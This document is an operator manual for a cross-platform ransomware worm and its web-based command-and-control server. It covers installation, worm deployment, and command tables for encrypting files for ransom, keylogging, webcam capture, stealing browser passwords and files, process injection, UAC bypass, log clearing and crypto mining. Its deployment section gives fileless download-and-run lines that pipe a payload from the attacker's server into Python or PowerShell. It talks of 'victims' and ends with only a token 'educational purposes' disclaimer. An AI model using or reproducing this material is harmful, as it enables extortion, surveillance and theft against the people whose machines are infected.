Cross-Platform Ransomware Worm with C2 Server
Complete Command & Control System Documentation
Table of Contents
Overview

Features

System Architecture

Installation Guide

C2 Server Installation

Worm Deployment

C2 Server Commands

Encryption Commands

Keylogger Commands

Webcam Commands

System Commands

Data Exfiltration Commands

Persistence Commands

Ransomware Commands

Miscellaneous Commands

API Reference

Troubleshooting

Security Considerations

Overview
This is a complete cross-platform Command & Control (C2) system consisting of:

C2 Server: A web-based dashboard for controlling infected machines

Worm Malware: Cross-platform agent that executes commands on Windows, macOS, and Linux

The system provides remote control capabilities including:

File encryption/decryption

Keystroke logging

Webcam access

Screenshot capture

Data exfiltration

Cryptocurrency mining

System command execution

Process injection

And much more!

Features
Worm Features
Cross-Platform: Works on Windows, macOS, and Linux

Anti-VM Detection: Detects virtual machines and sandboxes

Persistent: Multiple persistence mechanisms

Stealth: Clears logs, bypasses UAC

Encryption: AES-256 file encryption

Keylogging: Captures all keystrokes

Webcam: Capture images and stream

Data Exfiltration: Steals sensitive files

Crypto Mining: Fallback cryptocurrency mining

Process Injection: Injects code into running processes

Dead Man's Switch: Automatic encryption if no C2 contact

Checkpoint Resume: Resumes encryption if interrupted

C2 Server Features
Web Dashboard: Real-time host monitoring

WebSocket Support: Live updates

Command Templates: Pre-built command structures

Keylog Viewer: View captured keystrokes

Host Statistics: Detailed system information

Multi-Host: Control multiple infected machines

API Access: RESTful API for automation

Secure Login: Password-protected access

System Architecture
text
+-------------------------------------------------------------+
|                      C2 SERVER                              |
|                   (Your Computer)                           |
|                                                             |
|  +---------------+---------------+---------------------+   |
|  |  Web Dashboard |  WebSocket    |  REST API          |   |
|  |  (Port 5000)   |  (Real-time)  |  (HTTP)            |   |
|  +---------------+---------------+---------------------+   |
|                                                             |
|  +-----------------------------------------------------+   |
|  |               SQLite Database                        |   |
|  |  (Hosts, Commands, Keylogs, Encrypted Files)        |   |
|  +-----------------------------------------------------+   |
+-------------------------------------------------------------+
                           |
                    DNS/HTTP Beacons
                           |
        +------------------+------------------+
        |                  |                  |
+-------+-------+  +-------+-------+  +-------+-------+
|  Windows     |  |  macOS         |  |  Linux       |
|  Worm Agent  |  |  Worm Agent    |  |  Worm Agent  |
+--------------+  +----------------+  +--------------+
Installation Guide
C2 Server Installation
Option 1: Quick Install (All OS)
bash
# 1. Clone or download the c2_server.py file

# 2. Install Python dependencies
pip install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3

# 3. Run the server
python c2_server.py
Option 2: Detailed Installation by OS
<details> <summary><b>Windows Installation</b></summary>
powershell
# 1. Install Python (if not installed)
# Download from: https://www.python.org/downloads/

# 2. Open Command Prompt as Administrator
# 3. Install dependencies
python -m pip install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3

# 4. Allow firewall access
# Windows will prompt to allow Python access - click "Allow"

# 5. Run the server
python c2_server.py

# 6. Access the dashboard
# Open browser: http://localhost:5000
</details><details> <summary><b>macOS Installation</b></summary>
bash
# 1. Install Homebrew (if not installed)
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# 2. Install Python and Tkinter
brew install python3 python-tk

# 3. Install dependencies
pip3 install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3

# 4. Allow incoming connections
# System Preferences > Security & Privacy > Firewall > Allow Python

# 5. Run the server
python3 c2_server.py

# 6. Access the dashboard
# Open browser: http://localhost:5000
</details><details> <summary><b>Linux Installation</b></summary>
bash
# 1. Install Python and pip
sudo apt update
sudo apt install python3 python3-pip python3-tk -y  # Ubuntu/Debian
# OR
sudo yum install python3 python3-pip -y  # CentOS/RHEL

# 2. Install dependencies
pip3 install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3

# 3. Allow firewall access (if enabled)
sudo ufw allow 5000  # Ubuntu/Debian
# OR
sudo firewall-cmd --add-port=5000/tcp --permanent  # CentOS/RHEL

# 4. Run the server
python3 c2_server.py

# 5. Access the dashboard
# Open browser: http://your-ip:5000
</details>
Initial Server Configuration
After starting the server, you'll see:

text
============================================================
C2 SERVER v2.0
============================================================
Server URL: http://0.0.0.0:5000
Username: admin
Password: secure_password_123
============================================================
Waiting for connections...
============================================================
IMPORTANT: Change the default password by editing the ADMIN_PASSWORD variable in the code!

Worm Deployment
Configuring the Worm
Edit the worm code to point to your C2 server:

python
# In the worm code, change this line:
C2_SERVER = 'your-ip-address-or-domain.com'  # e.g., '192.168.1.100'
Deployment Methods
bash
# Method 1: Direct execution
python3 worm.py

# Method 2: Fileless execution (download and run)
curl -s http://your-c2-server/worm.py | python3

# Method 3: PowerShell (Windows)
powershell -command "Invoke-Expression (Invoke-WebRequest -Uri 'http://your-c2-server/worm.py').Content"

# Method 4: As a service (persistence)
# The worm automatically installs persistence on first run
C2 Server Commands
Command Structure
All commands are sent via the web dashboard with this JSON structure:

json
{
  "host_id": "target-host-id",
  "command": "command_name",
  "params": {
    "param1": "value1",
    "param2": "value2"
  }
}
Encryption Commands
Command	Description	Parameters	Example
encrypt	Encrypt all files	password: Encryption password	{"password": "mysecret"}
encrypt_files	Encrypt specific files	file_paths: Array of paths, password: Password	{"file_paths": ["/path/file.txt"], "password": "pass"}
encrypt_directory	Encrypt a directory	directory: Path, password: Password, recursive: true/false	{"directory": "/home/user/docs", "password": "pass"}
decrypt	Decrypt all files	password: Decryption password	{"password": "mysecret"}
decrypt_files	Decrypt specific files	file_paths: Array of encrypted paths, password: Password	{"file_paths": ["/path/file.txt.enc"], "password": "pass"}
decrypt_directory	Decrypt a directory	directory: Path, password: Password, recursive: true/false	{"directory": "/home/user/docs", "password": "pass"}
encryption_status	Check encryption status	None	{}
encryption_stats	Get encryption statistics	None	{}
Keylogger Commands
Command	Description	Parameters	Example
keylog_start	Start capturing keystrokes	duration: Seconds to run (optional)	{"duration": 60}
keylog_stop	Stop capturing keystrokes	None	{}
keylog_status	Check keylogger status	None	{}
keylog_download	Download captured keystrokes	limit: Number of entries	{"limit": 100}
keylog_clear	Clear captured keystrokes	None	{}
Webcam Commands
Command	Description	Parameters	Example
webcam_capture	Capture a single frame	None	{}
webcam_stream	Stream webcam video	duration: Seconds, frame_rate: FPS	{"duration": 10, "frame_rate": 5}
webcam_status	Check webcam status	None	{}
webcam_release	Release webcam resources	None	{}
System Commands
Command	Description	Parameters	Example
execute	Run system command	command: Command to execute	{"command": "whoami"}
screenshot	Take screenshot	None	{}
screen_share	Share screen (one frame)	None	{}
block_computer	Lock/block computer	action: "lock"	{"action": "lock"}
list_processes	List running processes	None	{}
kill_process	Kill a process	pid: Process ID	{"pid": 1234}
inject_process	Inject code into process	pid: Process ID, shellcode: (optional)	{"pid": 1234}
Data Exfiltration Commands
Command	Description	Parameters	Example
exfiltrate	Steal files from system	max_files: Maximum files to steal	{"max_files": 50}
steal_browser	Steal browser passwords/cookies	None	{}
download_file	Download a file from victim	remote_path: Path to file	{"remote_path": "/etc/passwd"}
upload_file	Upload a file to victim	local_path: Source path, remote_path: Destination path	{"local_path": "file.txt", "remote_path": "/tmp/file.txt"}
collect_data	Collect system information	type: "system_info" or "file_list"	{"type": "system_info"}
file_search	Search for files	pattern: Search pattern, path: Directory to search	{"pattern": "*.docx", "path": "/home"}
directory_list	List directory contents	path: Directory path	{"path": "/home"}
Persistence Commands
Command	Description	Parameters	Example
install_persistence	Install multiple persistence methods	None	{}
persistence_status	Check persistence status	None	{}
Ransomware Commands
Command	Description	Parameters	Example
display_ransom_note	Display ransom note on victim	None	{}
change_ransom_amount	Change ransom amount	amount: New amount	{"amount": "1.0"}
change_payment_address	Change payment address	address: New BTC address	{"address": "1A1zP1e..."}
deadline	Set payment deadline	days: Number of days	{"days": 7}
Mining Commands
Command	Description	Parameters	Example
start_mining	Start cryptocurrency mining	wallet_address: Wallet address	{"wallet_address": "49cpNt..."}
stop_mining	Stop cryptocurrency mining	None	{}
mining_status	Check mining status	None	{}
Miscellaneous Commands
Command	Description	Parameters	Example
status	Get worm status	None	{}
heartbeat	Send heartbeat	None	{}
get_os_info	Get OS information	None	{}
get_stats	Get all statistics	None	{}
clear_logs	Clear system logs	None	{}
bypass_uac	Bypass Windows UAC	None	{}
check_environment	Check for VM/sandbox	None	{}
self_destruct	Self destruct	confirm: true	{"confirm": true}
API Reference
REST API Endpoints
Endpoint	Method	Description	Authentication
/api/hosts	GET	List all hosts	Required
/api/host/<host_id>	GET	Get host details	Required
/api/command	POST	Send command to host	Required
/api/beacon	POST	Receive beacon from host	Not Required
/api/command_result	POST	Receive command result	Not Required
/api/keylogs/<host_id>	GET	Get keylogs for host	Required
/api/encrypted_files/<host_id>	GET	Get encrypted files list	Required
/api/stats	GET	Get system statistics	Required
/api/command_templates	GET	Get command templates	Required
/api/clear_logs	POST	Clear all logs	Required
API Usage Examples
Send Command via API:

bash
curl -X POST http://localhost:5000/api/command \
  -H "Content-Type: application/json" \
  -d '{
    "host_id": "host-uuid-here",
    "command": "execute",
    "params": {"command": "whoami"}
  }'
Get Keylogs:

bash
curl http://localhost:5000/api/keylogs/host-uuid-here
Get Statistics:

bash
curl http://localhost:5000/api/stats
WebSocket Events
Event	Direction	Description
connect	Client -> Server	Establish WebSocket connection
disconnect	Client -> Server	Close WebSocket connection
beacon	Server -> Client	New beacon received
command_result	Server -> Client	Command result received
get_hosts	Client -> Server	Request hosts list
send_command	Client -> Server	Send command via WebSocket
hosts	Server -> Client	Hosts list response
Troubleshooting
Common Issues and Solutions
<details> <summary><b>Server Won't Start (Port in use)</b></summary>
bash
# Find process using port 5000
# Windows:
netstat -ano | findstr :5000
taskkill /PID <PID> /F

# Linux/macOS:
lsof -i :5000
kill -9 <PID>

# Or change port in C2_HOST and C2_PORT variables
</details><details> <summary><b>Worm Not Connecting</b></summary>
bash
# 1. Verify C2_SERVER in worm code
# 2. Check firewall allows port 5000
# 3. Test connection:
curl http://your-server-ip:5000/api/hosts
# 4. Check server logs for incoming beacons
</details><details> <summary><b>Keylogger Not Working</b></summary>
bash
# Windows: Run as Administrator
# macOS: Grant Accessibility and Input Monitoring permissions
# Linux: Run with sudo or add user to input group
sudo usermod -a -G input $USER
</details><details> <summary><b>Webcam Not Working</b></summary>
bash
# Install OpenCV:
pip install opencv-python opencv-python-headless

# macOS: Grant Camera permissions
# Linux: Install video4linux
sudo apt-get install v4l-utils
</details>
Security Considerations
Important Security Notes
Change Default Password

python
ADMIN_PASSWORD = 'your-strong-password-here'  # Change this!
Use HTTPS in Production

python
# Add SSL certificate
socketio.run(app, host='0.0.0.0', port=5000, 
             ssl_context=('cert.pem', 'key.pem'))
Restrict Access

python
# Only allow specific IPs
ALLOWED_IPS = ['192.168.1.100', '10.0.0.5']
Change C2_DOMAIN

python
C2_DOMAIN = 'your-actual-domain.com'  # Use real domain
Regular Database Backups

bash
# Backup database
cp c2_database.db c2_database_backup_$(date +%Y%m%d).db
Command Examples
Complete Workflow Example
Start Server

bash
python c2_server.py
Deploy Worm

bash
# On target machine
python3 worm.py
Access Dashboard

Open http://localhost:5000

Login: admin / secure_password_123

Check Connected Hosts

View dashboard for online hosts

Send Commands

json
{
  "host_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "command": "keylog_start",
  "params": {
    "duration": 60
  }
}
View Results

Keylogs appear in host detail view

Command results shown in real-time

File Structure
text
c2_server/
├── c2_server.py          # Main C2 server
├── c2_database.db        # SQLite database
├── c2_server.log         # Server logs
└── requirements.txt      # Python dependencies

worm/
├── worm.py               # Main worm code
├── worm_debug.log        # Worm debug logs
└── ~/.system_update/     # Hidden directory for worm files
Update Process
Updating the Worm
Modify worm.py with new features

Deploy to C2 server

Send self_update command to victims

Updating the C2 Server
Backup database: cp c2_database.db c2_database_backup.db

Replace c2_server.py with new version

Restart server: python c2_server.py

Support
Log Files
C2 Server Logs: c2_server.log

Worm Debug Logs: worm_debug.log (on victim machine)

Database: c2_database.db (C2 server only)

Debug Mode
bash
# Run worm in debug mode
python3 worm.py --debug

# Check C2 server logs
tail -f c2_server.log
Disclaimer
This software is for educational and security research purposes only.

Do not use on systems you do not own or have explicit permission to test

The author is not responsible for any misuse or damage caused

Always follow applicable laws and regulations

License
This project is for educational purposes only.

Quick Reference Card
Component	Location	Access Method
C2 Server	http://localhost:5000	Login with admin credentials
Worm	Target machine	Auto-connects to C2
Commands	Dashboard or API	JSON formatted
Database	c2_database.db	SQLite
Logs	c2_server.log	Text file
